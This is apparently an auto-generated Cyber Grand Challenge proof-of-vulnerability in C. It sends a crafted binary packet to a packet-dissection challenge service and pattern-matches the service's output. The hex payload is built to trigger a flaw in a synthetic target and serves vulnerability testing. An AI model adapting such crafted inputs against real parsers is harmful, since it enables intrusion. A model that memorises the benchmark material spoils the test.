#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xc8\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xb0\x01\x00\x00\xa8\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\xa8\x01\x00\x00"
         "\x10\x31\xe2\xe9\x68\x3e\x16\x9b\x66\xba\xc0\xf5\x58\x7c\xf2\x72"
         "\x55\xed\x3d\xa0\x4d\x00\x00\x00\xe8\x51\x9c\x95\x83\x13\xf3\x73"
         "\x26\xa5\x54\xf2\x04\xc6\x9a\xfc\xa1\x2c\xba\x37\x9b\x06\x05\xff"
         "\xff\x01\x88\x01\x8d\x7c\x0a\xee\xac\xe6\x41\x00\xd3\x2d\x62\x66"
         "\x8c\xbb\x4d\x14\x08\xf2\x93\x7d\xe8\xce\x3e\x36\x49\x28\x9f\xe8"
         "\xb3\xae\x02\x85\x01\x00\xf5\xff\xff\x01\x46\x9a\x23\xfc\xaf\x41"
         "\x00\x06\xff\xff\x7e\x20\xfb\xd8\x01\xc7\x01\x00\xe4\x01\x00\x6d"
         "\xff\x41\x00\x41\x00\x2c\xed\x4e\x7d\x01\x00\x23\x41\x00\x6e\xce"
         "\xae\xf5\xb3\x6b\xf8\x11\xb0\x39\x33\xfc\x92\x07\x5e\xc6\xfb\x08"
         "\x5a\xed\x8c\xca\x31\x0a\x65\xf6\x1c\xf3\x41\x00\x50\x70\x3c\xce"
         "\x24\xb8\x06\x9d\xff\x30\x17\x50\x13\x3b\x6b\x55\x03\xdb\x2d\x10"
         "\x3c\x7d\x2c\x91\xd4\x2e\xdf\x2e\xb9\x15\x95\x0a\x4e\xad\xe9\x4c"
         "\xcb\xbb\xe1\x28\xbf\xa5\x37\xd3\x47\x2c\xf3\x0f\x9a\xb5\xaf\xa6"
         "\x3f\x3e\x0e\x02\x35\x38\x8e\x0b\xc3\x9d\xca\x5c\xb3\x69\x4b\x66"
         "\xe7\xcd\xbf\x5f\xde\xf5\x18\x22\x42\xdf\x54\xc6\xc2\x19\x16\x54"
         "\xfa\xab\xfe\x86\x70\x84\xd3\xba\xb3\xc0\x84\x02\xe9\x40\xed\x34"
         "\xa7\xbe\xef\x70\x90\xd2\x25\x39\xf9\x50\x0c\xfa\xf6\xca\xe8\xa4"
         "\xb8\xc7\x24\x96\xa8\x47\x98\x55\x7d\xb7\x05\x9d\x96\x49\x96\x00"
         "\x0a\x14\x66\x3c\x0a\x33\xdc\x31\xb6\xaf\xba\x31\x42\xeb\x6a\x2a"
         "\x40\x5f\xeb\xa3\x37\xb8\x81\xae\xe8\xe7\xdd\xca\xca\xe7\x85\xa4"
         "\x49\xc5\xcb\xfc\xb9\x1f\xc5\xd4\x5a\x6a\xc2\xe4\xcf\x58\x01\xaf"
         "\xc1\xf4\xad\x30\xfc\xca\x40\xd5\x78\x43\x51\xaf\xed\x8f\xa5\x39"
         "\x6a\x80\xf5\xb0\xa5\x72\x04\x60\xcb\x9c\xa4\x2f\xb9\xe1\x27\xfb"
         "\x6d\x7d\xf9\xa3\x96\x5e\x8a\x13\x6a\x6d\x87\x95\x80\x70\xb3\x7f"
         "\xa2\x9d\x9e\x61\xfd\xc6\x7e\x30\x4e\x04\xc1\xed\x8c\x98\xef\xc5"
         "\x2b\x5f\xc0\x78\x6f\xa8\x55\x20\x4a\x06\x8a\x6e\x5e\x3d\x29\xf5"
         "\x64\x3f\xca\x05\x9a\x7b\xe8\xb8";
      static unsigned int write_00001_00000_len = 456;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamakirombo
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x6b\x69\x72\x6f\x6d\x62"
         "\x6f";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
